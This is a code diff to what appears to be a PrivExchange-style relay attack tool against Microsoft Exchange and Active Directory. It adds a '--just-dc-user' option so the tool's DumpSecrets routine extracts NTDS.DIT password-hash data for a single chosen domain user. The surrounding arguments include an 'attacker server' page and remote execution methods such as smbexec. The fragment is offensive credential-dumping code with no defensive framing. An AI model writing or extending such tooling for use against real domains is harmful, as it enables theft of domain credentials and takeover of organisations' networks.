@@ -125,7 +125,11 @@ def gethash(passargs):
     password = passargs.password
     domain = passargs.domain
     execmethod = passargs.exec_method
-    dumper = DumpSecrets(remoteName, username, password, domain,execmethod)
+    if passargs.just_dc_user:
+        dcuser = passargs.just_dc_user
+    else:
+        dcuser = None
+    dumper = DumpSecrets(remoteName, username, password, domain,execmethod,dcuser)
     tmp = 0
     try:
         check = dumper.dump()
@@ -293,6 +297,8 @@ def main():
                         'method to use at target (only when using -use-vss). Default: smbexec')
     parser.add_argument("--exchange-version",default='Exchange2013',help='Exchange version of the target (default: Exchange2013, choices:Exchange2010,Exchange2010_SP1,Exchange2010_SP2,Exchange2013,Exchange2013_SP1,Exchange2016)',)
     parser.add_argument("--attacker-page", default="/privexchange/", help="Page to request on attacker server (default: /privexchange/)")
+    parser.add_argument('--just-dc-user', action='store', metavar='USERNAME',
+                        help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach.')
     parser.add_argument("--debug", action='store_true', help='Enable debug output')
     passargs = parser.parse_args()
     startServers(passargs)
